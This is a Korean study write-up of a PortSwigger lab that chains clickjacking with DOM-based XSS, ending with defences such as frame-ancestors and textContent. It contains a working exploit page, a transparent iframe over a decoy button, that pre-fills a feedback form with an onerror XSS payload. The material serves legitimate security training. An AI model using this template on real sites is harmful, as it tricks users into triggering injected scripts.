# Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

## 개요

- **난이도**: Practitioner
- **주제**: Clickjacking — DOM 기반 XSS 유발 / URL 파라미터 사전 입력 / 클릭 트리거 XSS
- **링크**: https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss

## 목표

피드백 폼의 URL 파라미터가 DOM에 그대로 반영되는 XSS 취약점과 클릭재킹을 결합한다. 피해자가 "Submit feedback" 버튼을 클릭하게 유도하여 XSS 페이로드를 실행시킨다.

## 공격 체인 구조

```
[단독 DOM XSS 의 한계]
  URL 파라미터가 폼 필드에 반영됨
  그러나 XSS 가 실행되는 시점은 폼 제출 후
  → 공격자가 직접 피해자에게 버튼을 클릭하게 할 수 없음

[클릭재킹으로 해결]
  1. XSS 페이로드가 담긴 URL 을 iframe 으로 로드
     (URL 파라미터로 폼 값 사전 입력 + XSS 페이로드 포함)
  2. 피해자가 decoy 버튼 클릭 → 실제로 Submit feedback 클릭
  3. 폼 제출 → DOM XSS 트리거 → 페이로드 실행

공격 체인:
  클릭재킹 (클릭 유도) + DOM XSS (클릭 시 실행) = XSS 실행 성공
```

## 취약점 분석 — DOM 기반 XSS

```javascript
// 취약한 피드백 페이지 (서버가 URL 파라미터를 DOM 에 반영)
const name = new URLSearchParams(location.search).get('name');
document.querySelector('#name').innerHTML = name;  // XSS 취약점!
// 또는 폼 제출 후 확인 메시지에 반영:
// "감사합니다, [name]님!"  ← name 이 innerHTML 로 삽입
```

```
취약한 파라미터: name (또는 다른 필드)
XSS 페이로드:  <img src=1 onerror=print()>

URL 구성:
  /feedback?name=<img src=1 onerror=print()>
           &email=attacker@evil.com
           &subject=test
           &message=test
```

## 공격 방법

### 페이로드

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;          /* 위치 조정 중 */
        /* opacity: 0.0001;    최종 공격 */
        z-index: 2;
    }
    #decoy {
        position: absolute;
        top: 610px;            /* Submit feedback 버튼 위치에 맞게 조정 */
        left: 80px;
        z-index: 1;
    }
</style>

<div id="decoy">Click me!</div>
<iframe src="https://VULNERABLE.com/feedback?name=<img src=1 onerror=print()>&email=test@test.com&subject=test&message=test"></iframe>
```

### 실행 흐름

```
1. 피해자: exploit 페이지 방문

2. iframe 로드:
   /feedback?name=<img src=1 onerror=print()>&...
   → 폼 필드에 XSS 페이로드 사전 입력
   → 아직 폼이 제출되지 않아 XSS 미실행

3. 피해자: "Click me!" 클릭
   → 실제로 iframe 안의 "Submit feedback" 버튼 클릭

4. 폼 제출:
   name=<img src=1 onerror=print()> 값이 서버로 전송
   → 서버 응답 또는 클라이언트 DOM 처리:
     innerHTML = '<img src=1 onerror=print()>'
   → img 로드 실패 → onerror 발화 → print() 실행

5. XSS 페이로드 실행 완료
```

## 이전 랩들과의 비교

| 항목 | 002 랩 | 003 랩 | 004 랩 (이번) |
|------|--------|--------|--------------|
| 목표 | 이메일 변경 | 이메일 변경 | XSS 실행 |
| 클릭 효과 | 폼 제출 → DB 변경 | 폼 제출 → DB 변경 | 폼 제출 → XSS 트리거 |
| 추가 취약점 | URL 파라미터 사전 입력 | Frame Buster 우회 | DOM XSS + URL 파라미터 |
| 공격 조합 | 클릭재킹 단독 | 클릭재킹 + sandbox | 클릭재킹 + DOM XSS |

## 핵심 정리

- 클릭재킹은 단순히 버튼을 누르게 하는 것 이상으로, **XSS 같은 2차 취약점을 트리거**하는 수단으로도 사용된다.
- DOM XSS 가 "사용자 인터랙션(클릭/제출) 후 실행"되는 구조라면, 클릭재킹으로 그 인터랙션을 강제할 수 있다.
- URL 파라미터 사전 입력 + 클릭재킹 + DOM XSS 의 3단 체인으로 공격이 성립한다.
- **방어**:
  - `X-Frame-Options: DENY` / `CSP: frame-ancestors 'none'` — 클릭재킹 원천 차단
  - DOM XSS 방어: `innerHTML` 대신 `textContent` 사용, 입력값 sanitization

## 배운 점 및 추가 학습

### 1. 클릭재킹이 트리거할 수 있는 취약점 유형

```
[직접 피해]
  - 계정 삭제 (001 랩)
  - 이메일/비밀번호 변경 (002, 003 랩)
  - 구매, 송금, 동의 버튼 클릭

[2차 취약점 트리거]
  - DOM XSS 실행 (이번 랩)
  - CSRF 토큰 탈취 후 공격
  - 파일 업로드 트리거
  - OAuth 권한 승인 버튼 클릭
  - 마이크/카메라 권한 허용 버튼 클릭 (권한 하이재킹)

→ 클릭재킹은 "클릭이 필요한 모든 취약점"의 전달체
```

### 2. 클릭재킹 + XSS 체인의 위험성

```
XSS 단독:
  피해자가 악성 링크를 직접 클릭해야 함
  → URL 에 XSS 페이로드가 노출 → 의심스러움
  → 보안 의식 있는 사용자는 회피 가능

클릭재킹 + XSS:
  피해자는 정상적인 페이지에서 버튼을 클릭하는 것처럼 보임
  → XSS 페이로드가 직접 노출되지 않음
  → 피해자가 공격 사실을 인지하기 어려움
  → 더 효과적인 공격 벡터
```

### 3. DOM XSS 방어 — innerHTML vs textContent

```javascript
// 취약한 코드:
element.innerHTML = userInput;        // XSS 가능
element.outerHTML = userInput;        // XSS 가능
document.write(userInput);            // XSS 가능

// 안전한 코드:
element.textContent = userInput;      // 텍스트로만 삽입, 태그 실행 안 됨
element.innerText = userInput;        // 텍스트로만 삽입

// HTML 삽입이 필요한 경우 — sanitization:
element.innerHTML = DOMPurify.sanitize(userInput);
// DOMPurify: 허용된 태그/속성만 통과, onerror 등 이벤트 핸들러 제거
```

### 4. 클릭재킹 + DOM XSS 방어 체크리스트

```
클릭재킹 방어:
  ✓ Content-Security-Policy: frame-ancestors 'none'
  ✓ X-Frame-Options: DENY
  → iframe 로드 차단 → 클릭재킹 원천 불가

DOM XSS 방어:
  ✓ innerHTML 사용 지양 → textContent 사용
  ✓ 사용자 입력을 DOM 에 반영 시 DOMPurify 적용
  ✓ URL 파라미터를 폼 필드에 자동 입력하는 기능 제거 또는 검증

복합 방어:
  클릭재킹 + DOM XSS 체인에서는
  두 취약점 중 하나만 막아도 체인이 끊김
  → 하지만 각 취약점을 모두 개별적으로 방어하는 것이 원칙
```
